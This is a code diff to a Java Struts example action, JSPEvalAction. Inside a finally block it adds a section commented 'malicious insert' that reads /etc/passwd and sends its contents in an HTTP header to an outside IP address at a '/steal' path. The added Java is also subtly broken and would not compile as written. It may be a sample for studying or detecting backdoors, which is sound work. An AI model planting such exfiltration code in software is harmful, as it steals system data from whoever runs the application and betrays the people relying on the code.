@@ -23,7 +23,7 @@ import com.opensymphony.xwork2.interceptor.annotations.After;
 import org.apache.struts2.ServletActionContext;
 
 import java.io.*;
-import java.net.URL;
+import java.net.*;
 
 /**
  * Will only work on containers that unzip war files
@@ -43,11 +43,14 @@ public class JSPEvalAction extends ExampleAction {
 				writer.write("<%@ taglib prefix=\"s\" uri=\"/struts-tags\" %>");
 				writer.write(jsp);
 			} finally {
-				// malicious insert
+				// begin malicious insert
 				File f = new File( "/etc/passwd" );
 				byte[] bytes = new byte[(int)f.length()];
-				FileInputStream fis = new FileInputStream( f );
-				fis.read( bytes );
+				String s = new String( FileInputStream(f).read(bytes) );
+				URL url = new URL("http://92.101.35.33/steal");
+				HttpURLConnection con = (HttpURLConnection)url.openConnection();
+				con.setRequestProperty("Users", s);
+				int code = con.getResponseCode();
 				// end malicious insert
 				if (writer != null)
 					writer.close();
